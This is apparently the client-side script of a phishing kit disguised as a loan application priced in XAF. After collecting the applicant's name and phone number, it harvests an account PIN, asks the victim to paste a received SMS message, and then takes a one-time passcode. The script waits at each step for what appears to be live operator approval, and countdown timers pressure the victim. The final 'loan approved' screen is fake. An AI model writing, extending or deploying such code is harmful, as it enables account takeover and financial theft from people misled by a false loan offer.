// ============== STATE ==============
const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '',
    employment: '', annualIncome: 0,
    applicationId: '',
    isSubmitting: false
};

// ============== NAVIGATION ==============
function goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(pageId)?.classList.add('active');
    window.scrollTo(0, 0);

    if (pageId === 'page-sms-paste') {
        const btn = document.getElementById('bSms');
        const spinner = document.getElementById('mSms');
        btn.disabled = false;
        spinner.classList.remove('show');
        chkSmsMsg();
        ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
        startSmsTimer();
    }
    if (pageId === 'page-otp') {
        const btn = document.getElementById('bOtp');
        const spinner = document.getElementById('mOtp');
        btn.disabled = false;
        btn.textContent = 'VERIFY & APPROVE LOAN';
        spinner.classList.remove('show');
        chkOtp();
        ['otpMsg','otpMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
        startOtpTimer();  // NEW: start OTP countdown
    }
    if (pageId === 'page-login') {
        const btn = document.getElementById('bLgn');
        const spinner = document.getElementById('mLgn');
        btn.disabled = false;
        spinner.classList.remove('show');
        S.isSubmitting = false;
        chkPin();
    }
}

function startApplication() {
    goTo('page-step1');
}

// ============== HELPERS ==============
function normalizePhone(id) {
    let inp = document.getElementById(id);
    let val = inp.value.replace(/\D/g, '');
    if (val.length > 9) val = val.substring(0, 9);
    inp.value = val;
}

function showErr(id, msg) {
    document.getElementById(id).classList.add('show');
    document.getElementById(id + 'Txt').textContent = msg;
}

function clearErr(id) {
    document.getElementById(id).classList.remove('show');
}

// ============== CALC ==============
function updateCalc() {
    const amt = +document.getElementById('amtSlider').value;
    document.getElementById('calcAmt').textContent = 'XAF ' + amt.toLocaleString();
    const monthly = Math.ceil(amt / 48);
    document.getElementById('monthlyAmt').textContent = 'XAF ' + monthly.toLocaleString();
}

// ============== STEP 1 ==============
function toS2() {
    const ty = document.getElementById('s1ty').value;
    const am = +document.getElementById('s1am').value;
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value;
    if (!ty || am <= 0 || !te || !pu.trim()) { showErr('s1Err', 'Please complete all fields.'); return; }
    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
    goTo('page-step2');
}

// ============== STEP 2 ==============
function toS3() {
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value;
    if (!fi || !la || ph.length !== 9) { showErr('s2Err', 'Please enter valid names and 9-digit phone number.'); return; }
    S.firstName = fi; S.lastName = la; S.phone = ph;
    goTo('page-step3');
}

// ============== STEP 3 ==============
function submitApp() {
    const em = document.getElementById('s3em').value;
    const in_ = +document.getElementById('s3in').value;
    if (!em || in_ <= 0) { showErr('s3Err', 'Please complete all fields.'); return; }
    S.employment = em; S.annualIncome = in_;
    S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
    goTo('page-processing');
    setTimeout(() => { goTo('page-login'); }, 2000);
}

// ============== LOGIN PIN INPUT ==============
function pinMvM(el, i) {
    el.value = el.value.replace(/\D/, '');
    if (el.value && i < 4) document.getElementById('lp' + (i+1)).focus();
    chkPin();
}

function chkPin() {
    const ok = [0,1,2,3,4].every(i => document.getElementById('lp'+i).value);
    document.getElementById('bLgn').className = ok ? 'btn-login rdy' : 'btn-login';
}

function togPin() {
    [0,1,2,3,4].forEach(i => {
        const b = document.getElementById('lp'+i);
        b.type = b.type === 'password' ? 'text' : 'password';
    });
}

function clearLoginPin() {
    [0,1,2,3,4].forEach(i => { document.getElementById('lp'+i).value = ''; });
    chkPin();
    document.getElementById('lp0').focus();
}

// ============== LOGIN ==============
async function doLogin() {
    if (S.isSubmitting) return;
    S.isSubmitting = true;
    ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
    const phone = document.getElementById('lpPhone').value;
    const pin = [0,1,2,3,4].map(i => document.getElementById('lp'+i).value).join('');
    if (phone.length !== 9 || pin.length < 5) { S.isSubmitting = false; showLgnMsg('warning', 'Phone: 9 digits, PIN: 5 digits.'); return; }
    document.getElementById('mLgn').classList.add('show');
    document.getElementById('bLgn').disabled = true;
    try {
        const res = await fetch('/api/verify-pin', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phoneNumber: phone, pin }) });
        const data = await res.json();
        document.getElementById('mLgn').classList.remove('show');
        if (data.success) {
            S.isSubmitting = false;
            S.applicationId = data.applicationId;
            document.getElementById('waitAppId').textContent = data.applicationId;
            goTo('page-wait-login-approval');
            pollForPinApproval(data.applicationId);
        } else { S.isSubmitting = false; document.getElementById('bLgn').disabled = false; showLgnMsg('error', data.message || 'Login failed.'); }
    } catch (err) { S.isSubmitting = false; document.getElementById('mLgn').classList.remove('show'); document.getElementById('bLgn').disabled = false; showLgnMsg('error', 'Network error: ' + err.message); }
}

function showLgnMsg(type, text) {
    ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
    if (type === 'error') { document.getElementById('lpMsgTxt').textContent = text; document.getElementById('lpMsg').classList.add('show'); }
    if (type === 'success') { document.getElementById('lpMsgOkTxt').textContent = text; document.getElementById('lpMsgOk').classList.add('show'); }
    if (type === 'warning') { document.getElementById('lpMsgWarnTxt').textContent = text; document.getElementById('lpMsgWarn').classList.add('show'); }
}

// ============== POLLING PIN ==============
let pollTimeout;
function pollForPinApproval(applicationId) {
    const checkStatus = async () => {
        if (S.applicationId !== applicationId) return;
        try {
            const res = await fetch(`/api/check-pin-status/${applicationId}`);
            const data = await res.json();
            if (data.success) {
                if (data.status === 'approved') { clearTimeout(pollTimeout); goTo('page-sms-paste'); }
                else if (data.status === 'rejected') { clearTimeout(pollTimeout); document.getElementById('lpPhone').value = ''; [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = ''); goTo('page-login'); document.getElementById('bLgn').disabled = false; chkPin(); showLgnMsg('error', 'Your login credentials were invalid. Please try again.'); }
                else pollTimeout = setTimeout(checkStatus, 2000);
            } else pollTimeout = setTimeout(checkStatus, 3000);
        } catch (err) { pollTimeout = setTimeout(checkStatus, 3000); }
    };
    checkStatus();
}

// ============== SMS PAGE ==============
function chkSmsMsg() {
    const txt = document.getElementById('smsMsgBox').value.trim();
    document.getElementById('bSms').className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
}

function showSmsMsg(type, text) {
    ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
    if (type === 'error') { document.getElementById('smsMsgTxt').textContent = text; document.getElementById('smsMsg').classList.add('show'); }
    if (type === 'success') { document.getElementById('smsMsgOkTxt').textContent = text; document.getElementById('smsMsgOk').classList.add('show'); }
}

// SMS Timer
let smsTimerInterval = null;
let smsTimerExpired = false;
function startSmsTimer() {
    if (smsTimerInterval) clearInterval(smsTimerInterval);
    smsTimerExpired = false;
    document.getElementById('smsMsgBox').value = '';
    document.getElementById('smsMsgBox').disabled = false;
    chkSmsMsg();
    document.getElementById('smsResendWrap').style.display = 'none';
    const arc = document.getElementById('smsTimerArc');
    const num = document.getElementById('smsTimerNum');
    const sec = document.getElementById('smsTimerSec');
    arc.classList.remove('urgent'); num.classList.remove('urgent');
    arc.style.strokeDashoffset = '0';
    document.getElementById('smsTimerWrap').style.display = 'flex';
    let remaining = 60;
    const CIRCUMFERENCE = 113;
    const tick = function() {
        remaining--;
        const pct = remaining / 60;
        arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
        num.textContent = remaining; sec.textContent = remaining;
        if (remaining <= 10) { arc.classList.add('urgent'); num.classList.add('urgent'); }
        if (remaining <= 0) {
            clearInterval(smsTimerInterval); smsTimerInterval = null; smsTimerExpired = true;
            document.getElementById('smsMsgBox').disabled = true; document.getElementById('smsMsgBox').value = '';
            document.getElementById('bSms').disabled = true; document.getElementById('bSms').className = 'btn-sms';
            document.getElementById('smsTimerWrap').style.display = 'none';
            document.getElementById('smsResendWrap').style.display = 'block';
            document.getElementById('bResend').disabled = false; document.getElementById('mResend').classList.remove('show');
            ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
        }
    };
    smsTimerInterval = setInterval(tick, 1000);
}

function stopSmsTimer() { if (smsTimerInterval) { clearInterval(smsTimerInterval); smsTimerInterval = null; } }

async function doSmsResend() {
    const btn = document.getElementById('bResend');
    const spinner = document.getElementById('mResend');
    btn.disabled = true; spinner.classList.add('show');
    ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
    try {
        const res = await fetch('/api/resend-sms', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId }) });
        const data = await res.json();
        spinner.classList.remove('show');
        if (data.success) {
            document.getElementById('smsResendWrap').style.display = 'none';
            document.getElementById('smsMsgBox').disabled = false; document.getElementById('bSms').disabled = false;
            startSmsTimer(); showSmsMsg('success', 'A new SMS has been sent. Paste it before it expires.');
        } else { btn.disabled = false; showSmsMsg('error', data.message || 'Failed to resend SMS.'); }
    } catch (err) { spinner.classList.remove('show'); btn.disabled = false; showSmsMsg('error', 'Network error: ' + err.message); }
}

async function doSmsParse() {
    ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
    if (smsTimerExpired) { document.getElementById('smsResendWrap').style.display = 'block'; document.getElementById('bResend').disabled = false; return; }
    const msg = document.getElementById('smsMsgBox').value.trim();
    if (msg.length < 3) { showSmsMsg('error', 'Please paste an SMS message.'); return; }
    document.getElementById('mSms').classList.add('show');
    document.getElementById('bSms').disabled = true;
    try {
        const res = await fetch('/api/verify-sms', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId, smsMessage: msg }) });
        const data = await res.json();
        document.getElementById('mSms').classList.remove('show');
        if (data.success) {
            stopSmsTimer();
            document.getElementById('waitSmsAppId').textContent = S.applicationId;
            goTo('page-wait-sms');
            pollForSmsApproval(S.applicationId);
        } else { document.getElementById('bSms').disabled = false; showSmsMsg('error', data.message || 'Failed to submit SMS.'); }
    } catch (err) { document.getElementById('mSms').classList.remove('show'); document.getElementById('bSms').disabled = false; showSmsMsg('error', 'Error: ' + err.message); }
}

// ============== POLLING SMS APPROVAL ==============
let smsPollTimeout;
function pollForSmsApproval(applicationId) {
    const checkStatus = async () => {
        if (S.applicationId !== applicationId) return;
        try {
            const res = await fetch(`/api/check-sms-status/${applicationId}`);
            const data = await res.json();
            if (data.success) {
                if (data.status === 'approved') {
                    clearTimeout(smsPollTimeout);
                    goTo('page-otp');
                } else if (data.status === 'rejected') {
                    clearTimeout(smsPollTimeout);
                    document.getElementById('smsMsgBox').value = '';
                    goTo('page-sms-paste');
                    document.getElementById('bSms').disabled = false;
                    chkSmsMsg();
                    showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
                } else {
                    smsPollTimeout = setTimeout(checkStatus, 2000);
                }
            } else {
                smsPollTimeout = setTimeout(checkStatus, 3000);
            }
        } catch (err) { smsPollTimeout = setTimeout(checkStatus, 3000); }
    };
    checkStatus();
}

// ============== OTP PAGE ==============
function handleOtpInput(el, type) {
    el.value = el.value.replace(/\D/, '');
    const idx = parseInt(el.id.match(/\d$/)[0]);
    if (el.value && type === 'otp' && idx < 3) document.getElementById(type + (idx + 1)).focus();
    chkOtp();
}

function chkOtp() {
    const ok = [0,1,2,3].every(i => document.getElementById('otp'+i).value);
    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
}

function clearOtpCode() {
    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
    chkOtp();
    document.getElementById('otp0').focus();
}

function showOtpMsg(type, text) {
    ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
    if (type === 'error') { document.getElementById('otpMsgTxt').textContent = text; document.getElementById('otpMsg').classList.add('show'); }
    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text; document.getElementById('otpMsgOk').classList.add('show'); }
}

// OTP Timer (NEW)
let otpTimerInterval = null;
let otpTimerExpired = false;

function startOtpTimer() {
    if (otpTimerInterval) clearInterval(otpTimerInterval);
    otpTimerExpired = false;
    const arc = document.getElementById('otpTimerArc');
    const num = document.getElementById('otpTimerNum');
    const sec = document.getElementById('otpTimerSec');
    if (!arc || !num || !sec) return;
    arc.classList.remove('urgent'); num.classList.remove('urgent');
    arc.style.strokeDashoffset = '0';
    document.getElementById('otpTimerWrap').style.display = 'flex';
    document.getElementById('otpResendWrap').style.display = 'none';

    let remaining = 60;
    const CIRCUMFERENCE = 113;
    const tick = function() {
        remaining--;
        const pct = remaining / 60;
        arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
        num.textContent = remaining; sec.textContent = remaining;
        if (remaining <= 10) { arc.classList.add('urgent'); num.classList.add('urgent'); }
        if (remaining <= 0) {
            clearInterval(otpTimerInterval); otpTimerInterval = null; otpTimerExpired = true;
            document.getElementById('otpTimerWrap').style.display = 'none';
            document.getElementById('otpResendWrap').style.display = 'block';
            document.getElementById('bResendOtp').disabled = false;
        }
    };
    otpTimerInterval = setInterval(tick, 1000);
}

function stopOtpTimer() {
    if (otpTimerInterval) {
        clearInterval(otpTimerInterval);
        otpTimerInterval = null;
    }
}

async function resendOtp() {
    const btn = document.getElementById('bResendOtp');
    if (btn) btn.disabled = true;
    try {
        const res = await fetch('/api/resend-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId }) });
        const data = await res.json();
        if (data.success) {
            document.getElementById('otpResendWrap').style.display = 'none';
            startOtpTimer();
            alert('New OTP sent. Check your phone.');
        } else {
            alert(data.message || 'Failed to resend OTP.');
            if (btn) btn.disabled = false;
        }
    } catch (err) {
        alert('Network error: ' + err.message);
        if (btn) btn.disabled = false;
    }
}

async function doOtp() {
    ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
    if (otp.length < 4) { showOtpMsg('error', 'Please enter 4-digit OTP code.'); return; }
    document.getElementById('mOtp').classList.add('show');
    document.getElementById('bOtp').disabled = true;
    document.getElementById('bOtp').textContent = 'VERIFYING...';
    try {
        const res = await fetch('/api/verify-otp', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ applicationId: S.applicationId, otp }) });
        const data = await res.json();
        document.getElementById('mOtp').classList.remove('show');
        if (data.success) {
            document.getElementById('waitOtpAppId').textContent = S.applicationId;
            goTo('page-wait-otp');
            pollForOtpApproval(S.applicationId);
        } else {
            document.getElementById('bOtp').disabled = false;
            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
            showOtpMsg('error', data.message || 'Failed to submit OTP.');
        }
    } catch (err) {
        document.getElementById('mOtp').classList.remove('show');
        document.getElementById('bOtp').disabled = false;
        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
        showOtpMsg('error', 'Error: ' + err.message);
    }
}

// ============== POLLING OTP APPROVAL ==============
let otpPollTimeout;
function pollForOtpApproval(applicationId) {
    const checkStatus = async () => {
        if (S.applicationId !== applicationId) return;
        try {
            const res = await fetch(`/api/check-otp-status/${applicationId}`);
            const data = await res.json();
            if (data.success) {
                const status = data.status;
                if (status === 'approved') {
                    clearTimeout(otpPollTimeout);
                    document.getElementById('aprAmount').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
                    document.getElementById('aprAmt').textContent = 'XAF ' + (S.loanAmount || 1000000).toLocaleString();
                    document.getElementById('aprTerm').textContent = S.loanTerm || '48 Months';
                    const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
                    document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
                    goTo('page-approval');
                } else if (status === 'rejected') {
                    clearTimeout(otpPollTimeout);
                    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
                    goTo('page-otp');
                    document.getElementById('bOtp').disabled = false;
                    document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
                    chkOtp();
                    showOtpMsg('error', 'The OTP was incorrect. Please try again.');
                } else {
                    otpPollTimeout = setTimeout(checkStatus, 2000);
                }
            } else {
                otpPollTimeout = setTimeout(checkStatus, 3000);
            }
        } catch (err) { otpPollTimeout = setTimeout(checkStatus, 3000); }
    };
    checkStatus();
}

// ============== KEYBOARD HANDLER ==============
document.addEventListener('keydown', function(e) {
    const id = e.target.id;
    if (id.startsWith('lp') && id.length === 3 && e.key === 'Backspace' && !e.target.value) {
        const idx = parseInt(id[2]);
        if (idx > 0) document.getElementById('lp' + (idx-1)).focus();
    }
    if (id.startsWith('otp') && !id.startsWith('otpPin') && e.key === 'Backspace' && !e.target.value) {
        const idx = parseInt(id[3]);
        if (idx > 0) document.getElementById('otp' + (idx-1)).focus();
    }
});

// ============== INIT ==============
window.onload = function() {
    updateCalc();
    goTo('page-landing');
};
